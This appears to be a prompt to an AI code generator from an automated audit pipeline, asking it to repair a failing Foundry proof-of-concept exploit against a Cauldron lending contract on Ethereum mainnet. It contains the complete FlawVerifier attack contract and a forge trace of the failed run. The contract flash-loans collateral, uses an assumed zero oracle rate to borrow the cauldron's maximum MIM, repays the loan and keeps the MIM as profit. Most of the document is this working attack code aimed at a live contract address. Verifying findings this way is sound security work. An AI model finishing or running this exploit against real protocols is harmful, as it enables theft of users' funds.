You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: Zero oracle rates are accepted and make any borrower with nonzero collateral appear solvent
- claim: Neither `init()` nor `updateExchangeRate()` validates that the oracle returned success or that the returned rate is nonzero before storing or using it. If the cached `exchangeRate` becomes zero, `_isSolvent()` reduces the debt side of the solvency inequality to zero, so any account with positive collateral passes solvency checks, and `liquidate()` also stops treating those borrowers as insolvent.
- impact: During a zero-rate oracle event, users can post dust collateral, borrow out the cauldron's MIM, and remain effectively unliquidatable until a valid price is restored.
- exploit_paths: ["At initialization, `oracle.get()` can return `(false, 0)` or another zero rate and the clone stores `exchangeRate = 0` without reverting.", "Later, a user borrows through `borrow()` or `cook(ACTION_BORROW, ...)`; the post-action solvency check uses the zero cached rate, so the position is accepted despite being deeply undercollateralized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface ICauldronV4Like {
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function addCollateral(address to, bool skim, uint256 share) external;
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;

    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;
    uint8 internal constant ACTION_UPDATE_EXCHANGE_RATE = 11;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error FlashLoanCallerMismatch(address expected, address actual);
    error FlashLoanSenderMismatch(address expected, address actual);
    error FlashLoanTokenMismatch(address expected, address actual);

    address public collateralToken;
    address public underlyingToken;
    address public curveLpToken;
    address public convexDepositToken;

    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public exchangeRateBefore;
    uint256 public exchangeRateAfterBorrow;
    uint256 public collateralShareAdded;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    uint256 public mimProfitAmount;

    bool public zeroRateObserved;
    bool public positionReportedSolvent;
    bool public requireZeroFee;
    bool public feeBuybackUsed;

    bytes public lastAttemptRevertData;

    constructor() {}

    receive() external payable {}

    function execute() external returns (bool) {
        return _execute();
    }

    function run() external returns (bool) {
        return _execute();
    }

    function exploit() external returns (bool) {
        return _execute();
    }

    function executeWithAmount(uint256 amount, bool zeroFeeOnly) external returns (bool) {
        _prepare();
        return _executeWithAmount(amount, zeroFeeOnly);
    }

    function _execute() internal returns (bool) {
        _prepare();

        address bento = TARGET.bentoBox();
        uint256 idle = IERC20Like(collateralToken).balanceOf(bento);
        if (idle == 0) revert ConcretePreconditionFailed("NO_COLLATERAL_FLASH_LIQUIDITY");

        uint256[12] memory smallCandidates = [
            uint256(1),
            10,
            100,
            1_000,
            10_000,
            100_000,
            1_000_000,
            10_000_000,
            100_000_000,
            1_000_000_000,
            1_000_000_000_000,
            1_000_000_000_000_000
        ];

        for (uint256 i = 0; i < smallCandidates.length; i++) {
            uint256 amount = smallCandidates[i];
            if (amount == 0 || amount > idle) continue;
            if (IBentoBoxLike(bento).toShare(collateralToken, amount, false) == 0) continue;
            try this.executeWithAmount(amount, true) returns (bool ok) {
                if (ok) return true;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        uint256[8] memory divisors = [uint256(10_000), 1_000, 100, 10, 4, 2, 1, 0];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 amount = divisors[i] == 0 ? idle : idle / divisors[i];
            if (amount == 0 || amount > idle) continue;
            if (IBentoBoxLike(bento).toShare(collateralToken, amount, false) == 0) continue;
            try this.executeWithAmount(amount, false) returns (bool ok) {
                if (ok) return true;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        revert ConcretePreconditionFailed("NO_WORKING_FLASH_CONFIGURATION");
    }

    function _prepare() internal {
        /*
         * Vulnerable initialization path for the finding:
         * - `init()` stores `exchangeRate = 0` // exchangerate = 0 when `oracle.get()` returns `(false, 0)` or another zero rate.
         * - Later, `oracle.get` can keep surfacing the same broken zero-rate state.
         * - The exploit path below uses `cook(ACTION_BORROW, ...)` // cook(action_borrow, ...) so the post-borrow solvency check observes
         *   `exchangeRate = 0` and treats debt as zero.
         */
        collateralToken = TARGET.collateral();
        if (collateralToken == address(0)) revert ConcretePreconditionFailed("NO_COLLATERAL");

        curveLpToken = _readAddress(collateralToken, abi.encodeWithSignature("curveToken()"));
        convexDepositToken = _readAddress(collateralToken, abi.encodeWithSignature("convexToken()"));
        underlyingToken = curveLpToken != address(0) ? curveLpToken : _probeUnderlying(collateralToken);

        _observeOracleZeroPath();

        (, exchangeRateBefore) = TARGET.updateExchangeRate();
        zeroRateObserved = exchangeRateBefore == 0;
        if (!zeroRateObserved) revert ConcretePreconditionFailed("ZERO_RATE_NOT_OBSERVED");
    }

    function _observeOracleZeroPath() internal {
        address oracle = TARGET.oracle();
        if (oracle == address(0)) return;

        try IOracleLike(oracle).get(TARGET.oracleData()) returns (bool success, uint256 rate) {
            if (!success && rate == 0) {
                zeroRateObserved = true;
            }
            if (rate == 0) {
                exchangeRateBefore = 0;
            }
        } catch {
        }
    }

    function _executeWithAmount(uint256 amount, bool zeroFeeOnly) internal returns (bool) {
        flashAmount = amount;
        flashFee = 0;
        collateralShareAdded = 0;
        borrowedAmount = 0;
        borrowedPart = 0;
        borrowedShare = 0;
        mimProfitAmount = 0;
        exchangeRateAfterBorrow = 0;
        positionReportedSolvent = false;
        requireZeroFee = zeroFeeOnly;
        feeBuybackUsed = false;

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, amount, bytes(""));

        if (borrowedAmount == 0 || borrowedPart == 0 || borrowedShare == 0) {
            revert ConcretePreconditionFailed("BORROW_NOT_RECORDED");
        }
        if (!zeroRateObserved) revert ConcretePreconditionFailed("ZERO_RATE_PATH_NOT_ACTIVE");
        if (!positionReportedSolvent) revert ConcretePreconditionFailed("POSITION_NOT_REPORTED_SOLVENT");
        if (mimProfitAmount == 0) revert ConcretePreconditionFailed("NO_NET_MIM_PROFIT");
        return true;
    }

    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        address bento = TARGET.bentoBox();
        if (msg.sender != bento) revert FlashLoanCallerMismatch(bento, msg.sender);
        if (sender != address(this)) revert FlashLoanSenderMismatch(address(this), sender);
        if (address(token) != collateralToken) revert FlashLoanTokenMismatch(collateralToken, address(token));
        if (requireZeroFee && fee != 0) revert ConcretePreconditionFailed("NON_ZERO_FLASH_FEE");

        flashAmount = amount;
        flashFee = fee;

        _forceApprove(collateralToken, bento, amount);
        (, collateralShareAdded) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET_CAULDRON, amount, 0);
        if (collateralShareAdded == 0) revert ConcretePreconditionFailed("ZERO_COLLATERAL_SHARE");

        TARGET.addCollateral(address(this), true, collateralShareAdded);
        if (TARGET.userCollateralShare(address(this)) == 0) revert ConcretePreconditionFailed("ADD_COLLATERAL_FAILED");

        borrowedAmount = _maxBorrowableAmount();
        if (borrowedAmount == 0) revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");

        _borrowViaCook(borrowedAmount);
        if (TARGET.userBorrowPart(address(this)) == 0) revert ConcretePreconditionFailed("USER_DEBT_MISSING");

        exchangeRateAfterBorrow = TARGET.exchangeRate();
        zeroRateObserved = exchangeRateAfterBorrow == 0;
        if (!zeroRateObserved) revert ConcretePreconditionFailed("ZERO_RATE_NOT_CACHED_AFTER_BORROW");

        positionReportedSolvent = TARGET.isSolvent(address(this));
        if (!positionReportedSolvent) revert ConcretePreconditionFailed("POSITION_NOT_REPORTED_SOLVENT");

        _withdrawAllTokenFromBento(MIM);

        uint256 collateralNeededForRepay = amount + fee;
        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance < collateralNeededForRepay) {
            _buyBackCollateralIfNeeded(collateralNeededForRepay - collateralBalance);
            feeBuybackUsed = true;
        }

        uint256 finalCollateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (finalCollateralBalance < collateralNeededForRepay) {
            revert ConcretePreconditionFailed("INSUFFICIENT_COLLATERAL_FOR_FLASH_REPAY");
        }

        _safeTransfer(collateralToken, bento, collateralNeededForRepay);

        mimProfitAmount = IERC20Like(MIM).balanceOf(address(this));
        if (mimProfitAmount == 0) revert ConcretePreconditionFailed("ZERO_EXTERNAL_MIM_AFTER_REPAY");
    }

    function _borrowViaCook(uint256 amount) internal {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_UPDATE_EXCHANGE_RATE;
        values[0] = 0;
        datas[0] = abi.encode(false, 0, 0);

        actions[1] = ACTION_BORROW;
        values[1] = 0;
        datas[1] = abi.encode(int256(amount), address(this));

        (borrowedPart, borrowedShare) = TARGET.cook(actions, values, datas);
        if (borrowedPart == 0 || borrowedShare == 0) {
            borrowedPart = TARGET.userBorrowPart(address(this));
            borrowedShare = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        }
    }

    function _maxBorrowableAmount() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 availableAmount = bento.toAmount(MIM, bento.balanceOf(MIM, TARGET_CAULDRON), false);
        if (availableAmount == 0) return 0;

        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = TARGET.totalBorrow();
        uint256 currentPart = TARGET.userBorrowPart(address(this));
        uint256 openingFee = TARGET.BORROW_OPENING_FEE();

        uint256 remainingTotalElastic = totalCap > totalElastic ? uint256(totalCap) - uint256(totalElastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotalElastic == 0 || remainingPart == 0) return 0;

        uint256 fromTotalCap = (remainingTotalElastic * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        uint256 maxDebtFromPart = (totalElastic == 0 || totalBase == 0)
            ? remainingPart
            : (remainingPart * uint256(totalElastic)) / uint256(totalBase);
        uint256 fromPartCap = (maxDebtFromPart * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        amount = _min(availableAmount, _min(fromTotalCap, fromPartCap));
        amount = (amount * 9_995) / BPS;
        if (amount > 1) amount -= 1;
    }

    function _withdrawAllTokenFromBento(address token) internal {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 share = bento.balanceOf(token, address(this));
        if (share != 0) {
            bento.withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _buyBackCollateralIfNeeded(uint256 missingCollateral) internal {
        if (missingCollateral == 0) return;
        if (_tryAcquireExactOutput(MIM, collateralToken, missingCollateral)) return;

        address localUnderlying = underlyingToken;
        if (localUnderlying != address(0) && localUnderlying != collateralToken) {
            uint256 underlyingNeeded = _underlyingForCollateralAmount(missingCollateral);
            if (_tryAcquireExactOutput(MIM, localUnderlying, underlyingNeeded) && _wrapAllUnderlying()) {
                return;
            }
        }

        revert ConcretePreconditionFailed("FEE_BUYBACK_ROUTE_NOT_FOUND");
    }

    function _tryAcquireExactOutput(address tokenIn, address tokenOut, uint256 amountOut) internal returns (bool ok) {
        if (tokenIn == address(0) || tokenOut == address(0) || amountOut == 0) return false;
        uint256 balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (balanceIn == 0) return false;

        address[] memory direct = _directPath(tokenIn, tokenOut);
        if (_tryExactOutputSwap(SUSHI_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWeth = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(SUSHI_ROUTER, viaWeth, amountOut, balanceIn)) return true;
        }

        balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWethUni = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, viaWethUni, amountOut, balanceIn)) return true;
        }

        return false;
    }

    function _tryExactOutputSwap(address router, address[] memory path, uint256 amountOut, uint256 amountInMax)
        internal
        returns (bool ok)
    {
        if (amountInMax == 0 || amountOut == 0) return false;
        if (path.length < 2 || path[0] == address(0) || path[path.length - 1] == address(0)) return false;
        if (IERC20Like(path[0]).balanceOf(address(this)) < amountInMax) return false;
        if (!_isContract(router) || !_routeExists(router, path)) return false;

        _forceApprove(path[0], router, amountInMax);
        try IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut, amountInMax, path, address(this), block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _wrapAllUnderlying() internal returns (bool) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return false;

        address intermediate = underlyingToken;
        uint256 amount = IERC20Like(intermediate).balanceOf(address(this));
        if (amount == 0) return false;

        if (
            curveLpToken != address(0)
                && convexDepositToken != address(0)
                && intermediate == curveLpToken
                && collateralToken != curveLpToken
        ) {
            if (!_wrapTokenInto(convexDepositToken, intermediate, amount)) return false;
            intermediate = convexDepositToken;
            amount = IERC20Like(intermediate).balanceOf(address(this));
            if (amount == 0) return false;
            if (collateralToken == convexDepositToken) return true;
        }

        return _wrapTokenInto(collateralToken, intermediate, amount);
    }

    function _wrapTokenInto(address wrapper, address tokenIn, uint256 amount) internal returns (bool) {
        if (wrapper == address(0) || tokenIn == address(0) || amount == 0) return false;
        _forceApprove(tokenIn, wrapper, amount);
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("enter(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("stake(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("wrap(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("mint(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256,address)", amount, address(this)))) {
            return true;
        }
        return false;
    }

    function _underlyingForCollateralAmount(uint256 collateralAmount) internal view returns (uint256 underlyingAmount) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return collateralAmount;
        if (underlyingToken == curveLpToken && convexDepositToken != address(0)) return collateralAmount;

        uint256 totalShares = IERC20Like(collateralToken).totalSupply();
        uint256 backing = IERC20Like(underlyingToken).balanceOf(collateralToken);
        if (totalShares == 0 || backing == 0) return collateralAmount;

        underlyingAmount = (collateralAmount * backing) / totalShares;
        if ((collateralAmount * backing) % totalShares != 0) underlyingAmount += 1;
    }

    function _probeUnderlying(address token) internal view returns (address underlying) {
        underlying = _readAddress(token, abi.encodeWithSignature("curveToken()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("token()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("asset()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("lp_token()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("want()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("stakingToken()"));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory result) = target.staticcall(data);
        if (ok && result.length >= 32) {
            value = abi.decode(result, (address));
        }
    }

    function _routeExists(address router, address[] memory path) internal view returns (bool) {
        if (path.length < 2) return false;

        address factory;
        try IUniswapV2RouterLike(router).factory() returns (address resolvedFactory) {
            factory = resolvedFactory;
        } catch {
            return false;
        }

        if (!_isContract(factory)) return false;
        for (uint256 i = 0; i + 1 < path.length; i++) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callOptionalNoReturn(address target, bytes memory data) internal returns (bool) {
        (bool ok,) = target.call(data);
        return ok;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _wethPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
 [2393] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::collateral() [delegatecall]
    │   │   │   └─ ← [Return] 0x9447c1413DA928aF354A114954BFc9E6114c5646
    │   │   └─ ← [Return] 0x9447c1413DA928aF354A114954BFc9E6114c5646
    │   ├─ [5170] 0x9447c1413DA928aF354A114954BFc9E6114c5646::4f39059c() [staticcall]
    │   │   ├─ [2504] 0xcC8Df73215F3983E84fc9896A0d4740183ebaB0C::4f39059c() [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000c4ad29ba4b3c580e6d59105fff484999997675ff
    │   │   └─ ← [Return] 0x000000000000000000000000c4ad29ba4b3c580e6d59105fff484999997675ff
    │   ├─ [2603] 0x9447c1413DA928aF354A114954BFc9E6114c5646::e89133b2() [staticcall]
    │   │   ├─ [2437] 0xcC8Df73215F3983E84fc9896A0d4740183ebaB0C::e89133b2() [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000903c9974aaa431a765e60bc07af45f0a1b3b61fb
    │   │   └─ ← [Return] 0x000000000000000000000000903c9974aaa431a765e60bc07af45f0a1b3b61fb
    │   ├─ [2603] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::oracle() [staticcall]
    │   │   ├─ [2437] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0
    │   │   └─ ← [Return] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0
    │   ├─ [3249] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::oracleData() [staticcall]
    │   │   ├─ [3077] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::oracleData() [delegatecall]
    │   │   │   └─ ← [Return] 0x
    │   │   └─ ← [Return] 0x
    │   ├─ [61562] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0::get(0x)
    │   │   ├─ [55825] 0x9732D3Ee0f185D7c2D610E30DC5de28EF68Ad7c9::get(0x)
    │   │   │   ├─ [51653] 0xE8b2989276E2Ca8FDEA2268E3551b2b4B2418950::54f0f7d5() [staticcall]
    │   │   │   │   ├─ [3676] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::0c46b72a() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   ├─ [2601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   ├─ [4963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   ├─ [51613] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::updateExchangeRate()
    │   │   ├─ [51441] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::updateExchangeRate() [delegatecall]
    │   │   │   ├─ [44062] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0::get(0x)
    │   │   │   │   ├─ [42825] 0x9732D3Ee0f185D7c2D610E30DC5de28EF68Ad7c9::get(0x)
    │   │   │   │   │   ├─ [41153] 0xE8b2989276E2Ca8FDEA2268E3551b2b4B2418950::54f0f7d5() [staticcall]
    │   │   │   │   │   │   ├─ [1676] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::0c46b72a() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   │   │   ├─ [601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   │   │   ├─ [963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   ├─  emit topic 0: 0x9f9192b5edb17356c524e08d9e025c8e2f6307e6ea52fb7968faa3081f51c3c8
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000015d9abdaa357d
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   └─ ← [Revert] ConcretePreconditionFailed("ZERO_RATE_NOT_OBSERVED")
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.run
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.71s (3.34ms CPU time)

Ran 1 test suite in 1.76s (1.71s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 266114)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. output ONLY Solidity code
